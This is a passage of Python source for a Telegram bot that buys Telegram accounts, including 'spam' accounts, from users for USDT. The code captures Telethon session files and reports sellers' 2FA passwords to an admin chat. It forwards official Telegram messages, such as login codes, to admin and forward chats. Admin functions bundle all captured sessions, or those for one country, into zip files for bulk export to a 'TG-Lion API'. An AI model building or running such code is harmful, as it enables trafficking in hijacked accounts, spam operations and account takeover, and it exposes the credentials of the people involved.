                await context.bot.send_message(chat_id=FORWARD_CHAT_ID, text=forward_text)
            except Exception as e:
                logger.error(f"Spam forward error: {e}")
        asyncio.create_task(client.run_until_disconnected())

    for key in ['spam_pending_phone', 'spam_pending_country_data', 'spam_pending_client',
                'spam_pending_half_price', 'spam_pending_two_fa']:
        context.user_data.pop(key, None)

    await start(update, context)


async def spam_cancel_sale_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """User cancelled the spam account sale."""
    query = update.callback_query
    await query.answer()

    user_id = str(update.effective_user.id)
    phone = context.user_data.get('spam_pending_phone', 'N/A')
    country_data = context.user_data.get('spam_pending_country_data', {})
    half_price = context.user_data.get('spam_pending_half_price', 0)
    two_fa_password = context.user_data.get('spam_pending_two_fa')

    client = context.user_data.get('spam_pending_client')
    if client and client.is_connected():
        try:
            await client.disconnect()
        except Exception:
            pass

    # Notify admin that user cancelled
    try:
        admin_msg = (
            f"❌ **Spam Account — User Cancelled**\n\n"
            f"👤 **User ID:** `{user_id}`\n"
            f"📞 **Number:** `{phone}`\n"
            f"🌍 **Country:** {country_data.get('name', 'N/A')}\n"
            f"💰 **Offered Price:** ${half_price} USDT (40% of ${country_data.get('sell_price', 'N/A')})\n\n"
            f"🚫 User chose to cancel the spam account sale."
        )
        if two_fa_password:
            admin_msg += f"\n🔐 **2FA Password:** `{two_fa_password}`"
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_msg,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Failed to notify admin about spam cancel: {e}")

    for key in ['spam_pending_phone', 'spam_pending_country_data', 'spam_pending_client',
                'spam_pending_half_price', 'spam_pending_two_fa']:
        context.user_data.pop(key, None)

    await query.edit_message_text(
        "❌ <b>Sale Cancelled</b>\n\n"
        "Your sell request has been cancelled. You can start a new sale anytime.",
        parse_mode='HTML'
    )
    await start(update, context)


async def confirm_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin confirmation of OTP"""
    query = update.callback_query
    await query.answer()

    # Pattern: confirm_otp_{user_id}_{price}_{number}_{country}
    data = query.data.split('_')
    if len(data) < 5:
        return
        
    user_id = data[2]
    price = float(data[3])
    user_number = data[4]
    country_name = data[5] if len(data) > 5 else 'N/A'

    with user_data_lock:
        if user_id not in user_data:
            user_data[user_id] = {
                'main_balance_usdt': 0.0,
                'hold_balance_usdt': 0.0,
                'topup_balance_usdt': 0.0,
                'accounts_bought': 0,
                'accounts_sold': 0,
                'sold_numbers': [],
                'processing_details': [],
                'created_at': datetime.now().isoformat(),
                'last_activity': datetime.now().isoformat()
            }
        
        # Add to processing_details for web tracking ONLY NOW when confirmed & added to hold
        if 'processing_details' not in user_data[user_id]:
            user_data[user_id]['processing_details'] = []
            
        user_data[user_id]['processing_details'].append({
            'number': user_number,
            'price': price,
            'status': 'Processing',
            'timestamp': datetime.now().isoformat(),
            'country': country_name
        })
        save_user_data()

        user_data[user_id]['hold_balance_usdt'] += price
        user_data[user_id]['accounts_sold'] += 1
        if 'sold_numbers' not in user_data[user_id]:
            user_data[user_id]['sold_numbers'] = []
        user_data[user_id]['sold_numbers'].append(user_number)
        user_data[user_id]['last_activity'] = datetime.now().isoformat()
    
    save_user_data()

    # Notify user
    try:
        # Message Forwarding setup (without 2FA changes)
        try:
            client = context.user_data.get('client')
            if client and client.is_connected():
                @client.on(events.NewMessage())
                async def handler(event):
                    try:
                        # Skip groups and channels — only forward official Telegram messages from private chat
                        if not event.is_private:
                            return
                        is_official = event.sender_id == TELEGRAM_OFFICIAL_ID or getattr(event.sender, 'username', '') == 'Telegram'
                        if not is_official:
                            return

                        sender = await event.get_sender()
                        sender_name = getattr(sender, 'first_name', 'Unknown')
                        if not sender_name and hasattr(sender, 'title'):
                            sender_name = sender.title

                        forward_text = f"🔔 **New Message**\n📞 Number: `{user_number}`\n👤 Sender: {sender_name}\n\n{event.raw_text}"
                        forward_text += f"\n\nDEBUG: Sender ID: {event.sender_id}\nUsername: {getattr(sender, 'username', 'N/A')}"

                        try:
                            await context.bot.send_message(
                                chat_id=ADMIN_CHAT_ID,
                                text=forward_text
                            )
                        except Exception as admin_err:
                            logger.error(f"Failed to send to admin: {admin_err}")

                        try:
                            await context.bot.send_message(
                                chat_id=FORWARD_CHAT_ID,
                                text=forward_text
                            )
                        except Exception as forward_err:
                            logger.error(f"Failed to send to FORWARD_CHAT_ID ({FORWARD_CHAT_ID}): {forward_err}")

                        logger.info(f"Forwarding attempt complete for {user_number}")
                    except Exception as e:
                        logger.error(f"Forwarding error for {user_number}: {e}")
                
                asyncio.create_task(client.run_until_disconnected())
        except Exception as e:
            logger.error(f"Failed to set up forwarding for {user_number}: {e}")

        success_text = f"""
✅ **Confirm & Add to Hold completed - {user_number}**
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯

📞 **Number:** {user_number}
💰 **Sell price:** ${price} USD ✓
⏰ **Country's wait time:** 24 hrs ✓

🎉 **Submission successful!** ${price} USD has been added to your Hold Balance!
"""
        keyboard = [
            [InlineKeyboardButton("💰 Check Balance", callback_data="balance")],
            [InlineKeyboardButton("🔙 Sell More Accounts", callback_data="sell_account")],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=int(user_id), text=success_text, reply_markup=reply_markup, parse_mode='Markdown')

        # Send second notification to admin for final approval (Hold to Main)
        # Create processing entry ONLY when admin confirms it's on hold
        if 'processing_details' not in user_data[user_id]:
            user_data[user_id]['processing_details'] = []
        
        # We don't add to processing_details yet. 
        # Admin must click "Final Approval" to move to Successful.
        # However, the user wants "Confirm add to hold" logic. 
        # Let's adjust the admin approval button.

        admin_final_text = f"""
🔔 **Final Approval Required**

👤 **User ID:** `{user_id}`
📞 **Number:** `{user_number}`
💰 **Amount:** ${price} USD

The OTP was correct and balance is in **Hold**. Please confirm to transfer to **Main Balance**.
"""
        admin_final_keyboard = [
            [InlineKeyboardButton("✅ Final Approval (Transfer to Main)", callback_data=f"final_approve_{user_id}_{price}_{user_number}")],
            [InlineKeyboardButton("❌ Reject Transfer", callback_data=f"final_reject_{user_id}_{price}_{user_number}")]
        ]
        admin_final_markup = InlineKeyboardMarkup(admin_final_keyboard)
        
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_final_text,
            reply_markup=admin_final_markup,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Failed to notify user of OTP success or send final admin notification: {e}")

    await query.edit_message_text(f"✅ OTP Confirmed! ${price} added to Hold Balance of user {user_id}. Final approval request sent.")

async def final_approve_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin final confirmation to move from Hold to Main Balance"""
    query = update.callback_query
    await query.answer()

    # Pattern: final_approve_{user_id}_{price}_{number}
    data = query.data.split('_')
    if len(data) < 5:
        return
        
    user_id = data[2]
    price = float(data[3])
    user_number = data[4]

    with user_data_lock:
        if user_id in user_data:
            # Update status in processing_details
            if 'processing_details' in user_data[user_id]:
                for entry in user_data[user_id]['processing_details']:
                    if entry.get('number') == user_number:
                        entry['status'] = 'Successful'
                        break

            # Check if they actually have enough in hold
            if user_data[user_id].get('hold_balance_usdt', 0) >= price:
                user_data[user_id]['hold_balance_usdt'] -= price
                user_data[user_id]['main_balance_usdt'] += price
                user_data[user_id]['last_activity'] = datetime.now().isoformat()
                save_user_data()
            else:
                await query.edit_message_text(f"❌ Error: User {user_id} does not have enough Hold Balance.")
                return

    # Notify user (Professional Style)
    try:
        # Move successful transfer to SUCCESSFUL list in processing_details
        if 'processing_details' not in user_data[user_id]:
            user_data[user_id]['processing_details'] = []
            
        # Update existing processing entry or create new one for successful
        found = False
        for entry in user_data[user_id]['processing_details']:
            if entry.get('number') == user_number:
                entry['status'] = 'Successful'
                found = True
                break
        
        if not found:
            user_data[user_id]['processing_details'].append({
                'number': user_number,
                'price': price,
                'status': 'Successful',
                'timestamp': datetime.now().isoformat(),
                'country': 'N/A'
            })
        save_user_data()

        # Pull country (and flag) from this user's processing details if available.
        country_label = "N/A"
        try:
            for entry in user_data.get(user_id, {}).get('processing_details', []):
                if entry.get('number') == user_number and entry.get('country'):
                    country_label = entry['country']
                    break
        except Exception:
            pass
        flag = _extract_country_flag(country_label)
        header = f"🎉 <b>Congratulations!</b> {flag}".rstrip()

        congrats_text = (
            f"{header}\n"
            f"✅ <b>Successful</b>\n\n"
            "<blockquote>"
            f"🌍 <b>Country</b> : {html.escape(str(country_label))}\n"
            f"📞 <b>Number</b> : <code>{html.escape(str(user_number))}</code>\n"
            f"💵 <b>Price</b> : ${price} USD"
            "</blockquote>\n"
            "<blockquote>"
            f"💼 <b>Balance Update</b>\n"
            f"• Hold Balance  −  ${price}\n"
            f"• Main Balance  +  ${price}"
            "</blockquote>\n"
            "<i>Your payment has been moved from Hold Balance to Main Balance.</i>\n"
            "<i>You can now withdraw your earnings anytime.</i>\n\n"
            "Thank you for trusting us. 🚀"
        )
        await context.bot.send_message(chat_id=int(user_id), text=congrats_text, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Failed to notify user of final approval: {e}")

    await query.edit_message_text(f"✅ Final Approval! ${price} moved from Hold to Main for user {user_id}.")

async def final_reject_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin rejection of final transfer with balance deduction"""
    query = update.callback_query
    await query.answer()
    
    # Pattern: final_reject_{user_id}_{price}_{number}
    data = query.data.split('_')
    if len(data) < 5:
        return
        
    user_id = data[2]
    price = float(data[3])
    user_number = data[4]
    
    with user_data_lock:
        if user_id in user_data:
            # Update status in processing_details
            if 'processing_details' in user_data[user_id]:
                for entry in user_data[user_id]['processing_details']:
                    if entry.get('number') == user_number:
                        entry['status'] = 'Reject'
                        break

            # Deduct from hold balance as the sale failed/was rejected
            if user_data[user_id].get('hold_balance_usdt', 0) >= price:
                user_data[user_id]['hold_balance_usdt'] -= price
                user_data[user_id]['last_activity'] = datetime.now().isoformat()
                save_user_data()
            else:
                logger.warning(f"User {user_id} didn't have enough hold balance for rejection deduction")

    # Notify user (Professional Step-by-Step Style)
    try:
        # Update status in processing_details for rejection
        if 'processing_details' not in user_data[user_id]:
            user_data[user_id]['processing_details'] = []
            
        found = False
        for entry in user_data[user_id]['processing_details']:
            if entry.get('number') == user_number:
                entry['status'] = 'Reject'
                found = True
                break
        
        if not found:
            user_data[user_id]['processing_details'].append({
                'number': user_number,
                'price': price,
                'status': 'Reject',
                'timestamp': datetime.now().isoformat(),
                'country': 'N/A'
            })
        save_user_data()

        reject_text = (
            "🚫 <b>SUBMISSION REJECTED</b> 🚫\n\n"
            "<blockquote>"
            "📄 <b>Submission Summary</b>\n"
            f"📱 <b>Number</b> : <code>{html.escape(str(user_number))}</code>\n"
            f"💵 <b>Amount</b> : − ${price}\n"
            f"📊 <b>Status</b> : ❌ Rejected\n"
            f"📌 <b>Reason</b> : 🧊 Frozen / ♻️ Reset"
            "</blockquote>\n"
            "<blockquote>"
            "💼 <b>Balance Update</b>\n"
            f"⏳ <b>Hold Balance</b> : − ${price}"
            "</blockquote>"
        )
        await context.bot.send_message(chat_id=int(user_id), text=reject_text, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Failed to notify user of rejection: {e}")
        
    await query.edit_message_text(f"❌ Transfer rejected and funds deducted from Hold for user {user_id}, number {user_number}.")

async def wd_approve_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin approval of withdrawal request"""
    query = update.callback_query
    await query.answer()

    if str(query.from_user.id) != ADMIN_CHAT_ID:
        return

    wd_id = query.data.replace('wd_approve_', '')
    wd_data = pending_withdrawals.get(wd_id)
    if not wd_data:
        await query.edit_message_text("❌ Withdrawal request not found or already processed.")
        return

    user_id = wd_data['user_id']
    amount = wd_data['amount']
    method = wd_data['method']
    address = wd_data['address']
    tax_id = wd_data['tax_id']

    with user_data_lock:
        if user_id in user_data:
            user_data[user_id]['withdrawal_processing_balance'] = max(0, user_data[user_id].get('withdrawal_processing_balance', 0.0) - amount)
            user_data[user_id]['last_activity'] = datetime.now().isoformat()
            save_user_data()

    try:
        success_text = f"""
✅ **Withdrawal Successful!**
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯

💰 **Amount:** {amount:.2f} USDT
🌐 **Network:** {method}
📍 **Your Address:** `{address}`
🆔 **Tax ID:** `{tax_id}`

Your funds have been sent successfully. Thank you!
"""
        await context.bot.send_message(chat_id=int(user_id), text=success_text, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Failed to notify user of withdrawal approval: {e}")

    del pending_withdrawals[wd_id]
    await query.edit_message_text(f"✅ Withdrawal approved! {amount:.2f} USDT sent to {address} ({method}) for user {user_id}.")

async def wd_reject_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin rejection of withdrawal request - return balance to user"""
    query = update.callback_query
    await query.answer()

    if str(query.from_user.id) != ADMIN_CHAT_ID:
        return

    wd_id = query.data.replace('wd_reject_', '')
    wd_data = pending_withdrawals.get(wd_id)
    if not wd_data:
        await query.edit_message_text("❌ Withdrawal request not found or already processed.")
        return

    user_id = wd_data['user_id']
    amount = wd_data['amount']
    method = wd_data['method']

    with user_data_lock:
        if user_id in user_data:
            user_data[user_id]['main_balance_usdt'] = user_data[user_id].get('main_balance_usdt', 0.0) + amount
            user_data[user_id]['withdrawal_processing_balance'] = max(0, user_data[user_id].get('withdrawal_processing_balance', 0.0) - amount)
            user_data[user_id]['last_activity'] = datetime.now().isoformat()
            save_user_data()

    try:
        reject_text = f"""
❌ **Withdrawal Rejected**
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯

💰 **Amount:** {amount:.2f} USDT
🌐 **Network:** {method}
🔄 **Status:** Rejected

Your {amount:.2f} USDT has been returned to your Main Balance.
"""
        await context.bot.send_message(chat_id=int(user_id), text=reject_text, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Failed to notify user of withdrawal rejection: {e}")

    del pending_withdrawals[wd_id]
    await query.edit_message_text(f"❌ Withdrawal rejected! {amount:.2f} USDT returned to main balance for user {user_id}.")

async def wrong_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin rejection of OTP as wrong"""
    query = update.callback_query
    await query.answer()

    # Pattern: wrong_otp_{user_id}_{number}
    data = query.data.split('_')
    if len(data) < 4:
        return
        
    user_id = data[2]
    user_number = data[3]

    # Notify user
    try:
        error_text = f"""
❌ **OTP Verification Failed!**
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯

📞 **Number:** {user_number}
⚠️ The OTP you provided was incorrect. Please try again with the correct OTP.
"""
        await context.bot.send_message(chat_id=int(user_id), text=error_text, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Failed to notify user of OTP failure: {e}")

    await query.edit_message_text(f"❌ Wrong OTP reported to user {user_id} for number {user_number}.")

async def admin_download_data_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin request to download user data file"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.answer("❌ Access Denied!", show_alert=True)
        return

    save_user_data() # Ensure file is up to date

    if not os.path.exists('user_data.json'):
        await query.message.reply_text("❌ Data file not found!")
        return

    try:
        with open('user_data.json', 'rb') as f:
            await context.bot.send_document(
                chat_id=ADMIN_CHAT_ID,
                document=f,
                filename="user_data.json",
                caption="📊 Latest User Data Export"
            )
    except Exception as e:
        logger.error(f"Failed to send data file: {e}")
        await query.message.reply_text(f"❌ Error downloading data: {e}")

async def admin_download_countries_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin request to download countries_data.json (sell/buy prices)"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.answer("❌ Access Denied!", show_alert=True)
        return

    save_countries_data()  # Ensure file is up to date

    if not os.path.exists('countries_data.json'):
        await query.message.reply_text("❌ countries_data.json file not found!")
        return

    try:
        with open('countries_data.json', 'rb') as f:
            await context.bot.send_document(
                chat_id=ADMIN_CHAT_ID,
                document=f,
                filename="countries_data.json",
                caption="💰 Latest Sell/Buy Price Data Export"
            )
    except Exception as e:
        logger.error(f"Failed to send countries file: {e}")
        await query.message.reply_text(f"❌ Error downloading file: {e}")

async def admin_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show admin panel"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    bot_active = withdrawal_settings.get('bot_active', True)
    bot_status_text = "🟢 **ONLINE**" if bot_active else "🔴 **OFFLINE**"

    admin_text = f"""
🔧 **Admin Panel**

🤖 **Bot Status:** {bot_status_text}

💳 **Balance Control Options:**
• Main Balance Control - Manage user's Main Balance
• Hold Balance Control - Manage user's Hold Balance

💰 **Price Control Options:**
• Sell Account Price Control - Manage sell account prices
• Buy Account Price Control - Manage buy account prices

💳 **Payment Info Options:**
• Top-Up Info - Control payment method details

📊 **System Status:**
• All systems operational
• Database connected
"""

    keyboard = [
        [
            InlineKeyboardButton("✅ Bot ON", callback_data="admin_bot_on"),
            InlineKeyboardButton("❌ Bot OFF", callback_data="admin_bot_off")
        ],
        [InlineKeyboardButton("💳 Main Balance Control", callback_data="admin_main_balance")],
        [InlineKeyboardButton("⏳ Hold Balance Control", callback_data="admin_hold_balance")],
        [InlineKeyboardButton("💸 Sell Account Price Control", callback_data="admin_sell_price_control")],
        [InlineKeyboardButton("🛒 Buy Account Price Control", callback_data="admin_buy_price_control")],
        [InlineKeyboardButton("🆕 Add New Country", callback_data="admin_add_new_country")],
        [InlineKeyboardButton("🔗 Link Add", callback_data="admin_link_add")],
        [InlineKeyboardButton("🗑️ Delete Country", callback_data="admin_delete_country")],
        [InlineKeyboardButton("💳 Top-Up Info", callback_data="admin_topup_info")],
        [InlineKeyboardButton("🏦 Withdrawal Set", callback_data="admin_withdrawal_set")],
        [InlineKeyboardButton("📩 Send SMS", callback_data="admin_send_sms")],
        [InlineKeyboardButton("📊 Download Data", callback_data="admin_download_data")],
        [InlineKeyboardButton("💾 Download Sell Price File", callback_data="admin_download_countries")],
        [InlineKeyboardButton("💬 Chat User", callback_data="admin_chat_user")],
        [
            InlineKeyboardButton("🚫 Block Number", callback_data="admin_block_number"),
            InlineKeyboardButton("✅ Unblock Number", callback_data="admin_unblock_number"),
        ],
        [InlineKeyboardButton("📜 Blocked List", callback_data="admin_blocked_list")],
        [InlineKeyboardButton("📦 Download Sessions", callback_data="admin_download_sessions")],
        [InlineKeyboardButton("🌍 Select Country Sessions", callback_data="admin_country_sessions")],
        [InlineKeyboardButton("🚪 Logout", callback_data="admin_logout_list")],
        [InlineKeyboardButton("🔐 Login Management", callback_data="admin_login_list")],
        [InlineKeyboardButton("🔙 Balance View", callback_data="balance")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(admin_text, reply_markup=reply_markup, parse_mode='Markdown')


def _build_phone_country_map() -> dict:
    """Build a mapping of phone_part -> country_name from user_data processing_details."""
    phone_country = {}
    try:
        data = load_data()
        for uid, uinfo in data.items():
            for entry in uinfo.get('processing_details', []):
                number = entry.get('number', '')
                country = entry.get('country', '')
                if number and country:
                    clean = number.replace('+', '').replace(' ', '')
                    phone_country[clean] = country
    except Exception:
        pass
    return phone_country


def _get_sell_session_files() -> list:
    """Return list of (phone_part, full_path) for all sell_*.session files."""
    sessions_dir = 'sessions'
    result = []
    if not os.path.exists(sessions_dir):
        return result
    for fname in os.listdir(sessions_dir):
        if fname.startswith('sell_') and fname.endswith('.session') and not fname.endswith('-journal'):
            phone_part = fname[len('sell_'):-len('.session')]
            full_path = os.path.join(sessions_dir, fname)
            result.append((phone_part, full_path))
    return result


async def admin_download_sessions_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Download all sell_*.session files as a flat zip (TG-Lion API format)."""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.answer("❌ Access Denied!", show_alert=True)
        return

    sessions = _get_sell_session_files()
    if not sessions:
        await query.message.reply_text("❌ No session files found in sessions/ directory.")
        return

    warning = ""
    if len(sessions) < 10:
        warning = f"\n\n⚠️ *Warning:* TG-Lion API requires minimum 10 sessions. You have only {len(sessions)}. Add more accounts first."

    await query.message.reply_text(f"⏳ Preparing zip of {len(sessions)} session(s)...{warning}", parse_mode='Markdown')

    try:
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for phone_part, full_path in sessions:
                # Strip spaces so TG-Lion API accepts the filename
                clean_phone = phone_part.replace(' ', '')
                zf.write(full_path, arcname=f"{clean_phone}.session")
        zip_buffer.seek(0)

        await context.bot.send_document(
            chat_id=ADMIN_CHAT_ID,
            document=zip_buffer,
            filename="all_sessions.zip",
            caption=f"📦 All Account Sessions ({len(sessions)} accounts)"
        )
    except Exception as e:
        logger.error(f"admin_download_sessions error: {e}")
        await query.message.reply_text(f"❌ Error creating zip: {e}")


async def admin_country_sessions_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show list of countries that have logged-in sessions with counts."""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.answer("❌ Access Denied!", show_alert=True)
        return

    sessions = _get_sell_session_files()
    if not sessions:
        await query.message.reply_text("❌ No session files found.")
        return

    phone_country = _build_phone_country_map()

    # Group by country (strip spaces from phone_part before lookup)
    country_phones: dict = {}
    for phone_part, _ in sessions:
        clean_phone = phone_part.replace(' ', '')
        country = phone_country.get(clean_phone, 'Unknown')
        if country not in country_phones:
            country_phones[country] = []
        country_phones[country].append(phone_part)

    if not country_phones:
        await query.message.reply_text("❌ Could not determine country for any session.")
        return

    # Sort by count descending
    sorted_countries = sorted(country_phones.items(), key=lambda x: len(x[1]), reverse=True)

    keyboard = []
    for country_name, phones in sorted_countries:
        count = len(phones)
        # Encode country name safely for callback_data (max 64 bytes)
        safe_key = country_name.replace('|', '_')[:40]
        keyboard.append([
            InlineKeyboardButton(
                f"🌍 {country_name} — {count} account(s)",
                callback_data=f"admin_dl_country|{safe_key}"
            )
        ])
    keyboard.append([InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")])

    total = sum(len(v) for v in country_phones.values())
    await query.edit_message_text(
        f"🌍 *Select Country Sessions*\n\nTotal: {total} sessions across {len(country_phones)} countries.\nClick a country to download its sessions as zip.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )


async def admin_dl_country_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Download sessions for a specific country as a zip."""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.answer("❌ Access Denied!", show_alert=True)
        return

    # callback_data format: admin_dl_country|<country_name>
    parts = query.data.split('|', 1)
    if len(parts) < 2:
        await query.message.reply_text("❌ Invalid callback.")
        return
    selected_country = parts[1]

    sessions = _get_sell_session_files()
    phone_country = _build_phone_country_map()

    matched = []
    for phone_part, full_path in sessions:
        clean_phone = phone_part.replace(' ', '')
        country = phone_country.get(clean_phone, 'Unknown')
        country_key = country.replace('|', '_')[:40]
        if country_key == selected_country:
            matched.append((phone_part, full_path))

    if not matched:
        await query.message.reply_text(f"❌ No sessions found for: {selected_country}")
        return

    await query.message.reply_text(f"⏳ Preparing zip for {selected_country} ({len(matched)} session(s))...")

    try:
        zip_buffer = io.BytesIO()
        safe_name = re.sub(r'[^\w\s-]', '', selected_country).strip().replace(' ', '_')
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for phone_part, full_path in matched:
                clean_phone = phone_part.replace(' ', '')
                zf.write(full_path, arcname=f"{clean_phone}.session")
        zip_buffer.seek(0)

        await context.bot.send_document(
            chat_id=ADMIN_CHAT_ID,
            document=zip_buffer,
            filename=f"{safe_name}_sessions.zip",
            caption=f"🌍 {selected_country} Sessions ({len(matched)} accounts)"
        )
    except Exception as e:
        logger.error(f"admin_dl_country error: {e}")
        await query.message.reply_text(f"❌ Error creating zip: {e}")


async def admin_logout_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show every account currently logged into the bot via Telethon."""
    query = update.callback_query
    await query.answer()

    if str(query.from_user.id) != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    sessions_dir = 'sessions'
    if not os.path.isdir(sessions_dir):
        os.makedirs(sessions_dir, exist_ok=True)

    # Find every sell_*.session file (skip journals)
    session_files = []
    for fname in sorted(os.listdir(sessions_dir)):
        if fname.startswith('sell_') and fname.endswith('.session') and not fname.endswith('-journal'):
            phone_part = fname[len('sell_'):-len('.session')]
            session_files.append((phone_part, fname))

    if not session_files:
        keyboard = [[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]]
        await query.edit_message_text(
            "🚪 **Logout — Active Accounts**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "✅ No accounts are currently logged into the bot.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown',
        )
        return

    keyboard = []
    for phone_part, fname in session_files[:50]:  # cap at 50 per page
        # Display number with leading + for readability
        display = '+' + phone_part.replace(' ', '')
        keyboard.append([InlineKeyboardButton(
            f"🚪 Logout  {display}",
            callback_data=f"admin_logout_do|{fname}",
        )])
    keyboard.append([InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")])

    await query.edit_message_text(
        f"🚪 **Logout — Active Accounts**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 Total accounts logged in: *{len(session_files)}*\n\n"
        f"Press a button below to log that account out of the bot.\n"
        f"_(The session will be terminated and the file removed.)_",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )


async def admin_logout_do_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log a specific account out of the bot (disconnect Telethon + delete session file)."""
    query = update.callback_query
    await query.answer()

    if str(query.from_user.id) != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    try:
        _, fname = query.data.split('|', 1)
    except ValueError:
        await query.answer("Invalid request.", show_alert=True)
        return

    # Sanitize: must be a sell_*.session file inside sessions/
    if '/' in fname or '\\' in fname or not fname.startswith('sell_') or not fname.endswith('.session'):
        await query.answer("Invalid file.", show_alert=True)
        return

    sessions_dir = 'sessions'
    session_path = os.path.join(sessions_dir, fname)
    phone_part = fname[len('sell_'):-len('.session')]
    display = '+' + phone_part.replace(' ', '')

    if not os.path.exists(session_path):
        await query.answer("Session file not found (already logged out).", show_alert=True)
        await admin_logout_list_callback(update, context)
        return

    status = "✅ Logged out successfully."
    try:
        client = TelegramClient(session_path[:-len('.session')], TELEGRAM_API_ID, TELEGRAM_API_HASH)
        await client.connect()
        try:
            # Cleanly log out from Telegram so the bot session is invalidated.
            await client.log_out()
        except Exception as logout_err:
            logger.warning(f"[Admin Logout] log_out() failed for {display}: {logout_err}")
            try:
                await client.disconnect()
            except Exception:
                pass
            status = "⚠️ Could not call log_out() — session file removed locally."
    except Exception as conn_err:
        logger.error(f"[Admin Logout] connect failed for {display}: {conn_err}")
        status = "⚠️ Could not connect — session file removed locally."

    # Remove session file + journal
    for ext in ('.session', '.session-journal'):
        try:
            p = os.path.join(sessions_dir, fname[:-len('.session')] + ext)
            if os.path.exists(p):
                os.remove(p)
        except Exception as rm_err:
            logger.error(f"[Admin Logout] failed removing {p}: {rm_err}")

    keyboard = [
        [InlineKeyboardButton("🔙 Logout List", callback_data="admin_logout_list")],
        [InlineKeyboardButton("🏠 Admin Panel", callback_data="admin_panel")],
    ]
    await query.edit_message_text(
        f"🚪 **Logout Result**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📞 Number: `{display}`\n"
        f"{status}",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )


async def admin_login_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show all numbers currently logged into the bot via Telethon sessions."""
    query = update.callback_query
    await query.answer()

    if str(query.from_user.id) != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    sessions_dir = 'sessions'
    if not os.path.isdir(sessions_dir):
        os.makedirs(sessions_dir, exist_ok=True)

    session_files = []
    for fname in sorted(os.listdir(sessions_dir)):
        if fname.startswith('sell_') and fname.endswith('.session') and not fname.endswith('-journal'):
            phone_part = fname[len('sell_'):-len('.session')]
            session_files.append(phone_part)

    if not session_files:
        keyboard = [[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]]
        await query.edit_message_text(
            "🔐 *Login Management*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "✅ No accounts are currently logged in.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown',
        )
        return

    keyboard = []
    for phone_part in session_files[:50]:
        display = '+' + phone_part.replace(' ', '')
        keyboard.append([InlineKeyboardButton(
            f"📱 {display}",
            callback_data=f"admin_login_num|{phone_part}",
        )])
    keyboard.append([InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")])

    await query.edit_message_text(
        f"🔐 *Login Management*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 Logged-in accounts: *{len(session_files)}*\n\n"
